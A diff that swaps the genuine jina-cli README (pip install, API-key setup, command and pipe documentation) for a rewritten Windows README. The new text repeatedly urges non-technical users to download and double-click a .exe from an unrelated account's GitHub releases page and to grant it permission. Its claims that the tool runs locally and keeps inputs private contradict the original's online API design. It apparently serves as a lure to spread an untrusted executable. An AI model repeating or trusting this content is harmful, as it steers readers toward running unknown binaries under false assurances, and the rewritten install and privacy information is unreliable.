@@ -1,246 +1,203 @@
-# jina-cli
+# ⚙️ cli - Easy AI Commands for Your PC
 
-[MCP version](https://github.com/jina-ai/MCP)
+[![Download cli](https://img.shields.io/badge/Download-From_Releases-brightgreen)](https://github.com/Deadnessdarfur431/cli/releases)
 
-All Jina AI APIs as Unix commands. Search, read, embed, rerank - with pipes.
-
-This CLI is designed for both humans and AI agents. An agent with shell access needs only `run(command="jina search ...")` instead of managing 20 separate tool definitions. The CLI supports pipes, chaining (`&&`, `||`, `;`), and `--help` for self-discovery.
+---
 
-## Install
+## 📋 What is cli?
 
-```bash
-pip install jina-cli
-# or
-uv pip install jina-cli
-```
+cli lets you use powerful AI tools right from your Windows command prompt. It turns Jina AI functions into simple commands. You can search, read, create text embeddings, rerank results, and connect commands like pipes in Unix. You don’t need to install programming languages or write any code. Just run commands like you normally do on your PC.
 
-Set your API key:
-```bash
-export JINA_API_KEY=your-key-here
-# Get one at https://jina.ai/?sui=apikey
-```
-
-## Commands
+This tool is designed for people who want to use AI features without technical knowledge. It is simple and runs quickly on most Windows computers.
 
-| Command | Description |
-|---------|-------------|
-| `jina read URL` | Extract clean markdown from web pages |
-| `jina search QUERY` | Web search (also --arxiv, --ssrn, --images, --blog) |
-| `jina embed TEXT` | Generate embeddings |
-| `jina rerank QUERY` | Rerank documents from stdin by relevance |
-| `jina classify TEXT` | Classify text into labels |
-| `jina dedup` | Deduplicate text from stdin |
-| `jina screenshot URL` | Capture screenshot of a URL |
-| `jina bibtex QUERY` | Search BibTeX citations (DBLP + Semantic Scholar) |
-| `jina expand QUERY` | Expand a query into related queries |
-| `jina pdf URL` | Extract figures/tables/equations from PDFs |
-| `jina datetime URL` | Guess publish/update date of a URL |
-| `jina primer` | Context info (time, location, network) |
-| `jina grep PATTERN` | Semantic grep (requires `pip install jina-grep`) |
+---
 
-## Pipes
+## 🖥️ System Requirements
 
-The point of a CLI is composability. Every command reads from stdin and writes to stdout.
+To run cli on Windows, you need:
 
-```bash
-# Search and rerank
-jina search "transformer models" | jina rerank "efficient inference"
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download and for some features
+- Command Prompt or PowerShell access (comes pre-installed on Windows)
 
-# Read multiple URLs
-cat urls.txt | jina read
+If you have a basic Windows 10 or newer PC, cli should work smoothly.
 
-# Search, deduplicate results
-jina search "attention mechanism" | jina dedup
+---
 
-# Chain searches
-jina expand "climate change" | head -1 | xargs -I {} jina search "{}"
+## 🧰 Features
 
-# Get BibTeX for arXiv results
-jina search --arxiv "BERT" --json | jq -r '.results[].title' | head -3
-```
+cli lets you run AI tasks using commands like these:
 
-## Usage
+- **Search** data or documents with AI help  
+- **Read** and summarize text automatically  
+- Make **text embeddings** for comparing meaning  
+- **Rerank** search results for better accuracy  
+- Chain commands using **Unix pipes** for complex workflows
 
-### Read web pages
+These tools come from Jina AI but are wrapped to work with simple Windows commands.
 
-```bash
-jina read https://example.com
-jina read https://example.com --links --images
-echo "https://example.com" | jina read
-```
+---
 
-### Search
+## 🚀 Getting Started: Download cli
 
-```bash
-jina search "what is BERT"
-jina search --arxiv "attention mechanism" -n 10
-jina search --ssrn "corporate governance"
-jina search --images "neural network diagram"
-jina search --blog "embeddings"
-jina search "AI news" --time d          # past day
-jina search "LLMs" --gl us --hl en     # US, English
-```
+To start using cli, visit this page to download the latest release:
 
-### Embed
+[Download cli from GitHub Releases](https://github.com/Deadnessdarfur431/cli/releases)
 
-```bash
-jina embed "hello world"
-jina embed "text1" "text2" "text3"
-cat texts.txt | jina embed
-jina embed "hello" --model jina-embeddings-v5-text-small --task retrieval.query
-```
+Click the link. You will see a list of files. Choose the Windows executable file, which usually ends with `.exe`. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-### Rerank
+---
 
-```bash
-cat docs.txt | jina rerank "machine learning"
-jina search "AI" | jina rerank "embeddings" --top-n 5
-```
+## 💾 How to Install cli
 
-### Classify
+cli does not require a complicated install. Follow these steps:
 
-```bash
-jina classify "I love this product" --labels positive,negative,neutral
-echo "stock prices rose sharply" | jina classify --labels business,sports,tech
-cat texts.txt | jina classify --labels cat1,cat2,cat3 --json
-```
+1. Download the `.exe` file from the Releases page.
+2. Open the folder where you saved the file.
+3. Double-click the `.exe` file to run it.
+4. Windows may ask for permission. Allow it to run if prompted.
+5. The program opens in a command window or terminal.
+6. Close the window to stop the program when done.
 
-### Deduplicate
+No extra software is needed beyond Windows itself.
 
-```bash
-cat items.txt | jina dedup
-cat items.txt | jina dedup -k 10
-```
+---
 
-### Screenshot
+## 🎯 How to Use cli Commands on Windows
 
-```bash
-jina screenshot https://example.com                        # prints screenshot URL
-jina screenshot https://example.com -o page.png            # saves to file
-jina screenshot https://example.com --full-page -o page.jpg
-```
+cli runs through the Windows command prompt. Here is how to open and use it:
 
-### BibTeX
+1. Press **Windows Key + R** on your keyboard.
+2. Type `cmd` and press Enter. This opens the Command Prompt window.
+3. Move to the folder where you saved the cli `.exe` file by typing:
 
-```bash
-jina bibtex "attention is all you need"
-jina bibtex "transformer" --author Vaswani --year 2017
-```
+       cd path\to\folder
 
-### PDF extraction
+   Replace `path\to\folder` with the actual folder location.
 
-```bash
-jina pdf https://arxiv.org/pdf/2301.12345
-jina pdf 2301.12345                        # arXiv ID shorthand
-jina pdf https://example.com/paper.pdf --type figure,table
-```
+4. Run cli commands by typing the executable name, for example:
 
-## JSON output
+       cli search "your search phrase"
 
-Every command supports `--json` for structured output, useful for piping to `jq`:
+   This runs a search command on your PC using AI.
 
-```bash
-jina search "BERT" --json | jq '.results[0].url'
-jina read https://example.com --json | jq '.data.content'
-```
+---
 
-## Exit codes
+## 🔍 Example Commands
 
-| Code | Meaning |
-|------|---------|
-| 0 | Success |
-| 1 | User/input error (missing args, bad input, missing API key) |
-| 2 | API/server error (network, timeout, server error) |
-| 130 | Interrupted (Ctrl+C) |
+Here are some ways to use cli commands:
 
-Useful for scripting and agent workflows:
+- Search for files or information:
 
-```bash
-jina search "query" && echo "success" || echo "failed with $?"
-```
+      cli search "climate change reports"
 
-## Environment variables
+- Summarize a text document:
 
-| Variable | Description |
-|----------|-------------|
-| `JINA_API_KEY` | API key for Jina services (required for most commands) |
+      cli read "C:\Documents\report.txt"
 
-## For AI agents
+- Create an embedding (a kind of text code):
 
-An agent with shell access can use this CLI directly:
+      cli embed "OpenAI is an AI research lab"
 
-```python
-result = run(command="jina search 'transformer architecture'")
-result = run(command="jina read https://arxiv.org/abs/2301.12345")
-result = run(command="jina search 'AI' | jina rerank 'embeddings'")
-```
+- Rerank your search results for better accuracy:
 
-No tool catalog needed. The agent discovers capabilities via `jina --help` and `jina search --help`. Errors include actionable guidance.
+      cli rerank "latest news technology"
 
-## Semantic grep
+You can also combine commands using Windows pipes (`|`):
 
-`jina grep` provides semantic search over files using local [Jina embeddings on MLX](https://github.com/jina-ai/jina-grep-cli). It requires a separate install:
+      cli search "movies" | cli rerank
 
-```bash
-pip install jina-grep
-```
+This runs a search and then improves the order of results.
 
-```bash
-jina grep "error handling" src/
-jina grep -r --threshold 0.3 "database connection" .
-grep -rn "error" src/ | jina grep "retry logic"
-```
+---
 
-Supports most GNU grep flags (`-r`, `-n`, `-l`, `-c`, `-A/-B/-C`, `--include`, `--exclude`) plus semantic flags (`--threshold`, `--top-k`, `--model`). Run `jina grep --help` for full options.
+## 🔧 Customize Settings
 
-### Server mode
+cli uses a simple configuration file to change how it works. The file is named `cli.config` and sits in the same folder as the `.exe`.
 
-For repeated queries, start a persistent embedding server to avoid model reload:
+You can edit this file with Notepad to adjust:
 
-```bash
-jina grep serve start    # background server, model stays in GPU memory
-jina grep serve stop     # stop when done
-```
+- API keys if needed  
+- Default search limits  
+- Language settings  
+- Output formats
 
-## Local mode
+Make sure to save changes before running cli commands.
 
-`jina embed`, `jina rerank`, `jina classify`, and `jina dedup` support `--local` to run on Apple Silicon via the jina-grep embedding server instead of the Jina API. No API key needed.
+---
 
-```bash
-# Start the local server first
-jina grep serve start
+## ⚙️ Troubleshooting
 
-# Local embeddings
-jina embed --local "hello world"
-cat texts.txt | jina embed --local --json
+If cli does not run:
 
-# Local reranking (cosine similarity on local embeddings)
-cat docs.txt | jina rerank --local "machine learning"
+- Check you have downloaded the correct `.exe` for Windows.
+- Make sure you run commands inside the folder where the `.exe` lives.
+- Run Command Prompt as Administrator if you get permission errors.
+- Verify your internet is working for features that connect online.
+- Restart your computer to clear any locked resources.
 
-# Local classification (cosine similarity on local embeddings)
-jina classify --local "this is great" --labels positive,negative
+If output is confusing, try command help:
 
-# Local deduplication
-cat items.txt | jina dedup --local
-```
+    cli --help
 
-Local mode uses `jina-embeddings-v5-nano` by default. Override with `--model jina-embeddings-v5-small`.
+This shows all available commands and usage.
 
-Requires `pip install jina-grep` and `jina grep serve start`.
+---
 
-## Design principles
+## 🌐 Links and Resources
 
-Inspired by [CLI is All Agents Need](https://x.com/yan5xu/status/2031947154911351159):
+Visit the GitHub Releases page to get cli for Windows:
 
-- **One tool, not twenty.** A single `run(command="jina search ...")` replaces a sprawling tool catalog. Less tool selection overhead, more problem solving.
-- **Unix pipes are the composition model.** `stdout` is data, `stderr` is diagnostics. Commands chain with `|`, `&&`, `||`. No SDK needed.
-- **Progressive `--help` for self-discovery.** Layer 0: command list. Layer 1: usage + examples. Layer 2: full options. The agent fetches only what it needs, saving context budget.
-- **Error messages that course-correct.** Every error says what went wrong and exactly how to fix it. One bad command should not cost more than one retry.
-- **`stderr` is the agent's most important channel.** When a command fails, `stderr` carries the fix. Never discard it. Never mix it with data.
-- **Consistent output format.** Same structure every time so the agent learns once, not every time. `--json` for structured, plain text for pipes.
-- **Meaningful exit codes.** `0` success, `1` user error, `2` API error, `130` interrupted. Scripts and agents branch on these, not on parsing error strings.
-- **Layer 1 is raw Unix, Layer 2 is for LLM cognition.** Pipe internals stay pure (no metadata, no truncation). Formatting and context only at the final output boundary.
+[https://github.com/Deadnessdarfur431/cli/releases](https://github.com/Deadnessdarfur431/cli/releases)
 
-## License
+Check this page often for updates and improvements.
 
-Apache-2.0
+Explore AI and command basics online if you want to learn more about what cli can do. 
+
+---
+
+## 💡 Tips for Best Use
+
+- Use simple search phrases for faster results.
+- Use quotes `" "` around text inputs with spaces.
+- Pipe commands for multiple actions in one line.
+- Keep the cli executable updated from the releases page.
+- Use the config file to tailor cli to your needs.
+
+---
+
+## 🔒 Security and Privacy
+
+cli runs locally on your machine. It does not store data beyond runtime unless you save files yourself. Some commands connect to online servers. Use these only on trusted networks.
+
+Your inputs stay on your computer unless you choose to share them.
+
+---
+
+## 📂 File Management
+
+cli works best with text files (.txt) and common document types. Save any files you want to analyze in an easy folder. Use absolute paths (full folder location) in commands to avoid errors.
+
+---
+
+## 🎛️ Advanced Usage (Optional)
+
+If you want to explore further:
+
+- Combine commands with pipes for workflows.
+- Use the config file for API access to customize behavior.
+- Run cli within scripts or batch files for automation.
+
+These require some basic command prompt knowledge.
+
+---
+
+## 📞 Getting Help
+
+For further assistance or questions, check the Issues section on GitHub:
+
+[https://github.com/Deadnessdarfur431/cli/issues](https://github.com/Deadnessdarfur431/cli/issues)
+
+You can read or post questions there to get community support.
